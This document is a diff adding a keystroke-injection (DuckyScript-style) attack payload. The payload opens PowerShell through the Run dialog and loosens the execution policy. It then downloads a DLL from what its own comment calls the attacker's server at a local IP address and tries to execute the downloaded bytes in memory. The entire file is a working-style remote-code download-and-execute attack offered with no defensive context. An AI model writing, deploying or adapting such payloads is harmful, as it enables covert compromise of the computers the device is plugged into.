@@ -1,0 +1,29 @@
+DELAY 500
+REM Open PowerShell via Run
+GUI r
+DELAY 500
+STRING powershell   
+ENTER
+DELAY 1500
+STRING Set-ExecutionPolicy RemoteSigned -Scope Process
+ENTER
+DELAY 1500
+REM Load the compiled DLL into memory (hosted on the attacker's server)
+STRING $webClient = New-Object Net.WebClient
+ENTER
+DELAY 1500
+STRING $dllBytes = $webClient.DownloadData('http://192.168.1.15:8080/mydll.dll')
+ENTER
+DELAY 1500
+STRING $virtualAlloc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dllBytes.Length)
+ENTER
+DELAY 1500
+STRING [System.Runtime.InteropServices.Marshal]::Copy($dllBytes, 0, $virtualAlloc, $dllBytes.Length)
+ENTER
+DELAY 1500
+STRING $entryPoint = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($virtualAlloc, [Action])
+ENTER
+DELAY 1500
+STRING $entryPoint.Invoke()
+ENTER
+
